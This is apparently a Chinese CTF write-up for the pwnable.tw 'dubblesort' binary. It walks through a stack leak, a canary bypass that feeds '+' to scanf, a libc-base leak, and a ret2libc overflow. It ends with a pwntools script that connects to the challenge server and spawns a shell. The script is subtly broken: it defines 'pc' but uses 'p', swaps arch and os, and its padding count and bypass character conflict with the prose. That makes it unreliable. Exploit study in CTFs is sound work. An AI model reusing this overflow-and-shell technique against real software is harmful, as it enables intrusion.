---
title: dubblesort
categories:
- pwnable.tw
---
#
pwnable.tw/dubblesort
##
简介

这是写的第一篇writeup。虽然学了将近一个月pwn，但是还是不得要领，之所以要写这个的writeup，是因为这个很典型，中间用到了绕过canary以及尝试的过程，加上工具的使用，有很强的借鉴意义。

程序比较简单，放到IDA里F5，得到C代码，默认命名辨识度低，把一些重要变量重命名成易于记忆的名字，main函数里
![first_entry](./1.jpg)
其中canary的值不能发生变化，首先尝试输入amazing，发现输出的除了名字之后还有一些乱码，这是因为read读取的输入以换行结束，并不包含\x00，而printf输出的结束符为\x00，因此在输出名字之后还会继续向后输出，直到'\0'为止。这里是一个可以泄露栈内容的漏洞
![first_try](./2.jpg)
继续往下测试，发现这是一个对输入数字进行从小到大排序的程序，问题在于它并没有限制输入数字的数量，这就导致用户输入过长时产生栈溢出，在IDA中可以看到程序内部并没有system函数和'/bin/sh'，因此要从动态链接库里找，即构造ret2libc，gdb调试程序,在puts处下断点，输入4个数字，分别为1，2，3，4，在栈上的输入点为[esp+0x5c]，距离ebp的距离为0x7c,因此栈结构设计如下:  
![stack](./4.jpg)  
checksec ./dubblesort可以看到栈开启了各种保护，因为不是直接在栈上布置shellcode所以NX的保护没关系，FULL RELRO表示程序开始的时候会动态加载函数表，不能通过替换got表来执行恶意代码，最重要的是PIE和Canary，IDA里可以看到canary和输入点间的距离是0x60，在gdb中验证之后确实也如此
![checksec](./5.jpg)
![canary_position](./6.jpg)
最后的栈结构如下：  
![stack_with_canary](./7.jpg)

##
漏洞利用

###
绕过canary

漏洞还是蛮容易找到的，但是对于我这个菜鸡来说各种保护实在是太难绕过了，脚本也不熟，只能一点点尝试。首先canary上的值不能变，目前遇到的可以绕过canary的方法就是地址任意写，在这里我们要覆盖连续的栈空间，这条路走不通，只能是想方法不写到这块地址上，继续尝试输入，发现输入数字为f等非数字时直接停止之后的输入，直接输入结果，gdb调试发现此时栈上的内容没有发生变化，这是因为以%d格式读取字符时发生格式错误，输入无法写入到栈上，但是没有清空缓存区的函数，这个字符就一直留在缓冲区，之后读取都会发生错误，最终的结果就是这次输入之后的结果都无法写入到栈上，这样我们似乎可以通过输入字符绕过canary，但是此后的输入也无法写到栈上，因此要尝试新的输入，最后尝试到'-'发现为合法输入，但是不写到栈上，正好满足了我们的需求，因此我们前24个输入填充0，第25位输入'+'绕过保护，再填充比canary值大的数，这是因为之后的排序是从小到大排序，直接对整数指针操作，因此我们要保证canary值位置不变，必须按照递增顺序放置元素，在这里我们使用system函数的地址，因为这个地址大部分时间都大于canary的随机数，一直覆盖到ebp,共7个填充，加上最后覆盖的返回地址共8个system_addr

###
绕过PIE

绕过PIE的题还没见过，之前学习中讲的是要找到不变的部分，只能gdb慢慢找了。name那里之前提了一个漏洞，可以泄露栈上内容，当然之前说的在输入数字时不改变栈内容也可以泄露内容，但是canary必然会被破坏，因此我们最好利用read泄露地址,查看之后可以看到0xf7fb2000这个值似乎不随输入变化，而且vmmap查看发现这的确是动态链接库的地址,减去起始位置的距离发现偏移量为0x1b0000，使用readelf命令发现这个地址对应的got.plt地址，这样我们就得到了一个固定的got地址，最后，由于printf遇到'\x0'会停止输出，而这个地址最后总为'\0'，因此使用换行符覆盖最后一位，得到的leak地址再减去0x0a即可。
![find addr](./9.jpg)
![find_offset](./10.jpg)

##
payload.py

```-python
from pwn import *
context.update(arch='linux',os='i386')
context.log_level = 'DEBUG'
debug = 0
if debug:
    pc = process('./dubblesort')
else:
    pc = remote('chall.pwnable.tw', 10101)

got_off = 0x1b0000
libc = ELF('./libc_32.so.6')

p.recv()
p.sendline('a'*24)
got_addr = u32(p.recv()[30:34])-0xa
libc_addr = got_addr-got_off
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + libc.search('/bin/sh').next()
p.sendline('35')
p.recv()
for i in range(24):
    p.sendline('0')
    p.recv()
p.sendline('+')
p.recv()
for i in range(9):
    p.sendline(str(system_addr))
    p.recv()
p.sendline(str(bin_sh_addr))
p.recv()
p.interactive()
```
